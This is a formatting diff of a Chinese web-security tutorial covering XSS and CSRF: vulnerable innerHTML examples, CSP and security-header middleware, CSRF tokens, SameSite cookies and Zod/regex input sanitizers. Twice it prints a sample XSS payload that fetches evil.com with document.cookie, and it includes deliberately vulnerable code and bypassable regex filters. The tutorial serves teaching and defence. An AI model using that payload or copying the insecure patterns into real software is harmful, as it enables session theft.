@@ -14,11 +14,11 @@
 
 ### 三种 XSS
 
-| 类型 | 触发点 | 示例 |
-|------|--------|------|
-| 反射型 | URL 参数 → 服务器直接返回 | `?name=<script>...` |
-| 存储型 | 数据库 → 渲染到页面 | 评论/昵称含脚本 |
-| DOM 型 | 前端 JS 直接操作 DOM | `innerHTML = location.hash` |
+| 类型   | 触发点                    | 示例                        |
+| ------ | ------------------------- | --------------------------- |
+| 反射型 | URL 参数 → 服务器直接返回 | `?name=<script>...`         |
+| 存储型 | 数据库 → 渲染到页面       | 评论/昵称含脚本             |
+| DOM 型 | 前端 JS 直接操作 DOM      | `innerHTML = location.hash` |
 
 ### 攻击演练
 
@@ -27,15 +27,13 @@
 ```html
 <!-- 漏洞代码 -->
 <!-- 用户搜索: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->
-<div class="search-result">
-  搜索结果: <span id="query"></span>
-</div>
+<div class="search-result">搜索结果: <span id="query"></span></div>
 
 <script>
   // 漏洞: 直接从 URL 取参数，innerHTML 渲染
   const params = new URLSearchParams(location.search);
-  const query = params.get('q');
-  document.getElementById('query').innerHTML = query; // 🚨 XSS!
+  const query = params.get("q");
+  document.getElementById("query").innerHTML = query; // 🚨 XSS!
 </script>
 ```
 
@@ -43,17 +41,20 @@
 
 ```javascript
 // 后端: 存储评论时未做过滤
-app.post('/api/comments', (req, res) => {
+app.post("/api/comments", (req, res) => {
   const { content, userId } = req.body;
   // 直接存入数据库，没有 sanitization
-  db.query('INSERT INTO comments (content, user_id) VALUES (?, ?)', [content, userId]);
+  db.query("INSERT INTO comments (content, user_id) VALUES (?, ?)", [
+    content,
+    userId,
+  ]);
 });
 
 // 前端: 渲染评论时
 function renderComment(comment) {
-  const div = document.createElement('div');
+  const div = document.createElement("div");
   div.innerHTML = comment.content; // 🚨 如果 content 是 <img src=x onerror="steal()">
-  document.getElementById('comments').appendChild(div);
+  document.getElementById("comments").appendChild(div);
 }
 ```
 
@@ -62,7 +63,7 @@ function renderComment(comment) {
 ```javascript
 // 漏洞: 直接从 hash 取内容渲染
 const theme = location.hash.slice(1); // #<script>alert(1)</script>
-document.getElementById('theme-preview').innerHTML = theme; // 🚨 DOM XSS!
+document.getElementById("theme-preview").innerHTML = theme; // 🚨 DOM XSS!
 ```
 
 ### 防御方案
@@ -71,10 +72,10 @@ document.getElementById('theme-preview').innerHTML = theme; // 🚨 DOM XSS!
 
 ```javascript
 // ✅ 防御: textContent 代替 innerHTML
-document.getElementById('query').textContent = query; // 安全，浏览器自动转义
+document.getElementById("query").textContent = query; // 安全，浏览器自动转义
 
 // ✅ 必须用 innerHTML 时，先 sanitization
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 const clean = DOMPurify.sanitize(userInput);
 element.innerHTML = clean;
 ```
@@ -150,30 +151,32 @@ console.log(sanitizeRichText('<img src=x onerror="alert(1)">'));
 
 ```javascript
 // Elysia 中间件: 设置 CSP 响应头
-import { Elysia } from 'elysia';
+import { Elysia } from "elysia";
 
-const app = new Elysia()
-  .onAfterHandle(({ response }) => {
-    // 严格 CSP: 只允许同源资源
-    response.headers.set('Content-Security-Policy', [
-      "default-src 'self'",           // 默认只允许同源
-      "script-src 'self'",            // JS 只允许同源 (禁止 inline/script)
+const app = new Elysia().onAfterHandle(({ response }) => {
+  // 严格 CSP: 只允许同源资源
+  response.headers.set(
+    "Content-Security-Policy",
+    [
+      "default-src 'self'", // 默认只允许同源
+      "script-src 'self'", // JS 只允许同源 (禁止 inline/script)
       "style-src 'self' 'unsafe-inline'", // CSS 允许同源 + inline (Tailwind 需要)
-      "img-src 'self' data: https:",  // 图片允许同源 + base64 + HTTPS
+      "img-src 'self' data: https:", // 图片允许同源 + base64 + HTTPS
       "font-src 'self'",
-      "connect-src 'self'",           // fetch/XHR 只允许同源
-      "frame-ancestors 'none'",       // 禁止被 iframe 嵌入 (防 clickjacking)
-      "form-action 'self'",           // 表单只允许提交到同源
-      "base-uri 'self'",              // <base> 标签只允许同源
-      "object-src 'none'",            // 禁止 <object>/<embed>/<applet>
-    ].join('; '));
+      "connect-src 'self'", // fetch/XHR 只允许同源
+      "frame-ancestors 'none'", // 禁止被 iframe 嵌入 (防 clickjacking)
+      "form-action 'self'", // 表单只允许提交到同源
+      "base-uri 'self'", // <base> 标签只允许同源
+      "object-src 'none'", // 禁止 <object>/<embed>/<applet>
+    ].join("; "),
+  );
 
-    // 额外安全头
-    response.headers.set('X-Content-Type-Options', 'nosniff');
-    response.headers.set('X-Frame-Options', 'DENY');
-    response.headers.set('X-XSS-Protection', '1; mode=block');
-    response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
-  });
+  // 额外安全头
+  response.headers.set("X-Content-Type-Options", "nosniff");
+  response.headers.set("X-Frame-Options", "DENY");
+  response.headers.set("X-XSS-Protection", "1; mode=block");
+  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
+});
 ```
 
 #### 5. CSP Nonce (允许安全的 inline script)
@@ -189,7 +192,7 @@ const app = new Elysia()
 <!-- 没有 nonce 的 script 被 CSP 阻止 -->
 <script>
   // 攻击者的脚本 — 被 CSP block!
-  fetch('https://evil.com/steal?cookie='+document.cookie);
+  fetch("https://evil.com/steal?cookie=" + document.cookie);
 </script>
 ```
 
@@ -207,10 +210,10 @@ const app = new Elysia()
 
 ```javascript
 // 漏洞: 后端只检查 Cookie 认证，不验证请求来源
-app.post('/api/transfer', async ({ cookie, body }) => {
+app.post("/api/transfer", async ({ cookie, body }) => {
   const token = cookie.auth?.value;
   const user = await verifyToken(token);
-  if (!user) return { error: 'Unauthorized' };
+  if (!user) return { error: "Unauthorized" };
 
   // 🚨 问题: 只要 Cookie 有效就执行，不检查请求来源
   const { to, amount } = body;
@@ -238,12 +241,15 @@ app.post('/api/transfer', async ({ cookie, body }) => {
 
 ```javascript
 // 设置 Cookie 时添加 SameSite
-response.headers.set('Set-Cookie', [
-  `auth=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`,
-  // SameSite=Strict: 跨站请求不发送 Cookie
-  // SameSite=Lax:   GET 跨站请求发送 Cookie，POST 不发送
-  // SameSite=None:  跨站也发送 (需要 Secure)
-].join('; '));
+response.headers.set(
+  "Set-Cookie",
+  [
+    `auth=${token}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400`,
+    // SameSite=Strict: 跨站请求不发送 Cookie
+    // SameSite=Lax:   GET 跨站请求发送 Cookie，POST 不发送
+    // SameSite=None:  跨站也发送 (需要 Secure)
+  ].join("; "),
+);
 ```
 
 #### 2. CSRF Token (双重验证)
@@ -283,15 +289,17 @@ export function csrfProtection() {
 
 ```javascript
 // 完整 CSRF 防护中间件 (Elysia)
-import { Elysia, t } from 'elysia';
-import { randomBytes, createHash } from 'crypto';
+import { Elysia, t } from "elysia";
+import { randomBytes, createHash } from "crypto";
 
 const app = new Elysia()
   // 获取 CSRF Token 的端点
-  .get('/api/csrf-token', ({ cookie }) => {
-    const sessionId = cookie.session?.value || randomBytes(16).toString('hex');
-    const token = randomBytes(32).toString('hex');
-    const hashed = createHash('sha256').update(token + sessionId).digest('hex');
+  .get("/api/csrf-token", ({ cookie }) => {
+    const sessionId = cookie.session?.value || randomBytes(16).toString("hex");
+    const token = randomBytes(32).toString("hex");
+    const hashed = createHash("sha256")
+      .update(token + sessionId)
+      .digest("hex");
 
     return {
       token,
@@ -300,18 +308,22 @@ const app = new Elysia()
   })
 
   // 需要 CSRF 验证的端点
-  .post('/api/transfer', ({ body, headers }) => {
-    const csrfToken = headers['x-csrf-token'];
-    if (!csrfToken) {
-      return { error: 'CSRF token missing' };
-    }
-    // 验证逻辑...
-    return { success: true };
-  }, {
-    headers: t.Object({
-      'x-csrf-token': t.String(), // 强制要求 Header 中有 CSRF Token
-    }),
-  });
+  .post(
+    "/api/transfer",
+    ({ body, headers }) => {
+      const csrfToken = headers["x-csrf-token"];
+      if (!csrfToken) {
+        return { error: "CSRF token missing" };
+      }
+      // 验证逻辑...
+      return { success: true };
+    },
+    {
+      headers: t.Object({
+        "x-csrf-token": t.String(), // 强制要求 Header 中有 CSRF Token
+      }),
+    },
+  );
 ```
 
 #### 3. Origin/Referer 检查
@@ -348,23 +360,23 @@ export function checkOrigin(req: any) {
 
 ```javascript
 // 前端: 请求时将 CSRF Token 同时放在 Cookie 和 Header
-fetch('/api/transfer', {
-  method: 'POST',
-  credentials: 'include', // 携带 Cookie
+fetch("/api/transfer", {
+  method: "POST",
+  credentials: "include", // 携带 Cookie
   headers: {
-    'X-CSRF-Token': csrfToken, // 同时放在 Header
-    'Content-Type': 'application/json',
+    "X-CSRF-Token": csrfToken, // 同时放在 Header
+    "Content-Type": "application/json",
   },
-  body: JSON.stringify({ to: 'xxx', amount: 100 }),
+  body: JSON.stringify({ to: "xxx", amount: 100 }),
 });
 
 // 后端: 比较 Cookie 中的值和 Header 中的值
-app.post('/api/transfer', ({ cookie, headers, body }) => {
+app.post("/api/transfer", ({ cookie, headers, body }) => {
   const cookieToken = cookie.csrf?.value;
-  const headerToken = headers['x-csrf-token'];
+  const headerToken = headers["x-csrf-token"];
 
   if (!cookieToken || !headerToken || cookieToken !== headerToken) {
-    return { error: 'CSRF validation failed' };
+    return { error: "CSRF validation failed" };
   }
   // 通过验证，处理请求
 });
@@ -429,22 +441,19 @@ export function sanitizeComment(text: string): string {
 ```typescript
 // middleware/validate.ts — Zod 验证 + Sanitization
 
-import { z } from 'zod';
+import { z } from "zod";
 
 // 评论 Schema
 const CommentSchema = z.object({
   content: z
     .string()
-    .min(1, '评论不能为空')
-    .max(2000, '评论最多2000字')
+    .min(1, "评论不能为空")
+    .max(2000, "评论最多2000字")
     .refine(
       (val) => !/<script[\s\S]*?<\/script>/i.test(val),
-      '不允许 script 标签'
+      "不允许 script 标签",
     )
-    .refine(
-      (val) => !/on\w+\s*=/i.test(val),
-      '不允许事件处理器'
-    ),
+    .refine((val) => !/on\w+\s*=/i.test(val), "不允许事件处理器"),
   postId: z.string().uuid(),
 });
 
@@ -452,23 +461,20 @@ const CommentSchema = z.object({
 const RegisterSchema = z.object({
   username: z
     .string()
-    .min(2, '用户名至少2个字符')
-    .max(30, '用户名最多30个字符')
-    .regex(/^[\w\u4e00-\u9fff]+$/, '只允许字母、数字、中文、下划线'),
-  email: z.string().email('邮箱格式不正确'),
+    .min(2, "用户名至少2个字符")
+    .max(30, "用户名最多30个字符")
+    .regex(/^[\w\u4e00-\u9fff]+$/, "只允许字母、数字、中文、下划线"),
+  email: z.string().email("邮箱格式不正确"),
   password: z
     .string()
-    .min(8, '密码至少8个字符')
-    .regex(/[A-Z]/, '密码需包含大写字母')
-    .regex(/[0-9]/, '密码需包含数字'),
+    .min(8, "密码至少8个字符")
+    .regex(/[A-Z]/, "密码需包含大写字母")
+    .regex(/[0-9]/, "密码需包含数字"),
   bio: z
     .string()
-    .max(500, '简介最多500字')
+    .max(500, "简介最多500字")
     .optional()
-    .refine(
-      (val) => !val || !/<script/i.test(val),
-      '简介不允许 HTML 标签'
-    ),
+    .refine((val) => !val || !/<script/i.test(val), "简介不允许 HTML 标签"),
 });
 
 // 验证中间件
@@ -481,21 +487,21 @@ export function validate(schema: z.ZodType) {
     } catch (error) {
       if (error instanceof z.ZodError) {
         res.status(400).json({
-          error: 'Validation failed',
-          details: error.errors.map(e => ({
-            field: e.path.join('.'),
+          error: "Validation failed",
+          details: error.errors.map((e) => ({
+            field: e.path.join("."),
             message: e.message,
           })),
         });
       } else {
-        res.status(400).json({ error: 'Invalid request' });
+        res.status(400).json({ error: "Invalid request" });
       }
     }
   };
 }
 
 // 使用示例
-app.post('/api/comments', validate(CommentSchema), ({ validatedBody }) => {
+app.post("/api/comments", validate(CommentSchema), ({ validatedBody }) => {
   // validatedBody 已经是安全的、经过验证的数据
   return db.createComment(validatedBody);
 });
@@ -508,67 +514,80 @@ app.post('/api/comments', validate(CommentSchema), ({ validatedBody }) => {
 ```typescript
 // middleware/security.ts — 人格探索局安全中间件合集
 
-import { Elysia } from 'elysia';
-import { randomBytes, createHash } from 'crypto';
+import { Elysia } from "elysia";
+import { randomBytes, createHash } from "crypto";
 
 export function securityMiddleware(app: Elysia) {
-  return app
-    // 1. 安全响应头
-    .onAfterHandle(({ response }) => {
-      const headers = response.headers;
-      headers.set('Content-Security-Policy', [
-        "default-src 'self'",
-        "script-src 'self'",
-        "style-src 'self' 'unsafe-inline'",
-        "img-src 'self' data: https:",
-        "font-src 'self'",
-        "connect-src 'self' https://api.persona-lab.com",
-        "frame-ancestors 'none'",
-        "form-action 'self'",
-        "base-uri 'self'",
-        "object-src 'none'",
-        "upgrade-insecure-requests",
-      ].join('; '));
-      headers.set('X-Content-Type-Options', 'nosniff');
-      headers.set('X-Frame-Options', 'DENY');
-      headers.set('X-XSS-Protection', '1; mode=block');
-      headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
-      headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-    })
+  return (
+    app
+      // 1. 安全响应头
+      .onAfterHandle(({ response }) => {
+        const headers = response.headers;
+        headers.set(
+          "Content-Security-Policy",
+          [
+            "default-src 'self'",
+            "script-src 'self'",
+            "style-src 'self' 'unsafe-inline'",
+            "img-src 'self' data: https:",
+            "font-src 'self'",
+            "connect-src 'self' https://api.persona-lab.com",
+            "frame-ancestors 'none'",
+            "form-action 'self'",
+            "base-uri 'self'",
+            "object-src 'none'",
+            "upgrade-insecure-requests",
+          ].join("; "),
+        );
+        headers.set("X-Content-Type-Options", "nosniff");
+        headers.set("X-Frame-Options", "DENY");
+        headers.set("X-XSS-Protection", "1; mode=block");
+        headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
+        headers.set(
+          "Permissions-Policy",
+          "camera=(), microphone=(), geolocation=()",
+        );
+      })
 
-    // 2. 请求体大小限制 (防 DoS)
-    .onBeforeHandle(({ request, set }) => {
-      const contentLength = request.headers.get('content-length');
-      if (contentLength && parseInt(contentLength) > 1024 * 1024) { // 1MB
-        set.status = 413;
-        return { error: 'Request body too large' };
-      }
-    })
+      // 2. 请求体大小限制 (防 DoS)
+      .onBeforeHandle(({ request, set }) => {
+        const contentLength = request.headers.get("content-length");
+        if (contentLength && parseInt(contentLength) > 1024 * 1024) {
+          // 1MB
+          set.status = 413;
+          return { error: "Request body too large" };
+        }
+      })
 
-    // 3. 速率限制 (简单计数器，生产环境用 Redis)
-    .onBeforeHandle(({ request, ip }) => {
-      // 实际项目中用 Redis 滑动窗口
-      // 这里只做示意
-    })
+      // 3. 速率限制 (简单计数器，生产环境用 Redis)
+      .onBeforeHandle(({ request, ip }) => {
+        // 实际项目中用 Redis 滑动窗口
+        // 这里只做示意
+      })
 
-    // 4. 输入清洗 (全局)
-    .onBeforeHandle(async ({ body }) => {
-      if (body && typeof body === 'object') {
-        sanitizeObject(body);
-      }
-    });
+      // 4. 输入清洗 (全局)
+      .onBeforeHandle(async ({ body }) => {
+        if (body && typeof body === "object") {
+          sanitizeObject(body);
+        }
+      })
+  );
 }
 
 // 递归清洗对象
 function sanitizeObject(obj: any): void {
   for (const key in obj) {
-    if (typeof obj[key] === 'string') {
+    if (typeof obj[key] === "string") {
       obj[key] = sanitizeString(obj[key]);
-    } else if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
+    } else if (
+      typeof obj[key] === "object" &&
+      obj[key] !== null &&
+      !Array.isArray(obj[key])
+    ) {
       sanitizeObject(obj[key]);
     } else if (Array.isArray(obj[key])) {
       obj[key].forEach((item: any) => {
-        if (typeof item === 'object') sanitizeObject(item);
+        if (typeof item === "object") sanitizeObject(item);
       });
     }
   }
@@ -577,11 +596,11 @@ function sanitizeObject(obj: any): void {
 function sanitizeString(str: string): string {
   // 移除危险模式
   return str
-    .replace(/<script[\s\S]*?<\/script>/gi, '')
-    .replace(/<iframe[\s\S]*?<\/iframe>/gi, '')
-    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
-    .replace(/javascript:/gi, '')
-    .replace(/data:text\/html/gi, '');
+    .replace(/<script[\s\S]*?<\/script>/gi, "")
+    .replace(/<iframe[\s\S]*?<\/iframe>/gi, "")
+    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, "")
+    .replace(/javascript:/gi, "")
+    .replace(/data:text\/html/gi, "");
 }
 ```
 
